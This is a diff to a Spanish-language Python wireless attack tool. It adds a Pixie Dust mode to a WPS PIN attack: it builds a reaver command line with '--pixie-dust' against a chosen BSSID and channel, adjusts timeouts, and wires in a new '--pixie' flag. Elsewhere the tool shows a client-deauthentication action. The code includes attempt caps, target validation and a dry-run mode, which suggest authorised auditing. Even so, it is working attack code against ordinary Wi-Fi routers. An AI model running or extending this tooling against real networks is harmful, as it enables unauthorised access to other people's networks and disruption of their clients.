@@ -55,12 +55,16 @@ def binario(nombre):
     raise ValueError(f"falta {nombre}")
 
 
-def wps_pin(interfaz, bssid, canal, intentos=3, seco=False):
+def wps_pin(interfaz, bssid, canal, intentos=3, seco=False, pixie=False):
     bssid = validar_objetivo(interfaz, bssid, canal)
     if not 1 <= intentos <= 50:
         raise ValueError("--limite-intentos debe estar entre 1 y 50")
+    if pixie:
+        intentos = 1  # Pixie Dust no fuerza el PIN: captura nonces y los crackea offline
     if seco:
-        print(f"Plan: wash pasivo y hasta {intentos} pruebas WPS PIN en {bssid}, canal {canal}")
+        modo = "Pixie Dust (captura de nonces y crack offline)" if pixie \
+            else f"hasta {intentos} pruebas WPS PIN"
+        print(f"Plan: wash pasivo y {modo} en {bssid}, canal {canal}")
         return 0
     if os.geteuid() != 0:
         raise ValueError("requiere sudo e interfaz ya en modo monitor")
@@ -101,13 +105,17 @@ def wps_pin(interfaz, bssid, canal, intentos=3, seco=False):
             print("WPS anuncia bloqueo; no se enviaron intentos PIN")
             return 0
         with tempfile.TemporaryFile() as registro:
-            orden = [reaver, "-i", interfaz, "-b", bssid, "-c", str(canal),
-                     "-g", str(intentos), "-d", "5", "-l", "120"]
+            orden = [reaver, "-i", interfaz, "-b", bssid, "-c", str(canal)]
+            if pixie:
+                orden += ["--pixie-dust", "-vv", "-L", "-d", "5"]
+            else:
+                orden += ["-g", str(intentos), "-d", "5", "-l", "120"]
             if canal > 14:
                 orden.append("-5")
             try:
                 subprocess.run(orden, stdout=registro, stderr=subprocess.STDOUT,
-                               timeout=24 * intentos + 60, check=False, cwd=temporal,
+                               timeout=240 if pixie else 24 * intentos + 60,
+                               check=False, cwd=temporal,
                                preexec_fn=limitar_log)
             except subprocess.TimeoutExpired:
                 print("Límite temporal alcanzado; prueba WPS inconcluyente")
@@ -702,6 +710,8 @@ def main():
         subparser.add_argument("--dry-run", action="store_true")
         if accion == "wifi-wps-pin":
             subparser.add_argument("--limite-intentos", type=int, default=3)
+            subparser.add_argument("--pixie", action="store_true",
+                                   help="Pixie Dust: crack offline del PIN sin fuerza bruta")
         else:
             subparser.add_argument("--banda", choices=("2g", "5g"))
             subparser.add_argument("--segundos", type=int, default=30)
@@ -739,7 +749,7 @@ def main():
     try:
         if args.accion == "wifi-wps-pin":
             return wps_pin(args.interfaz, args.bssid, args.canal,
-                           args.limite_intentos, args.dry_run)
+                           args.limite_intentos, args.dry_run, args.pixie)
         if args.accion == "wifi-deauth":
             return deauth(args.interfaz, args.bssid, args.cliente,
                           args.golpes, args.dry_run)
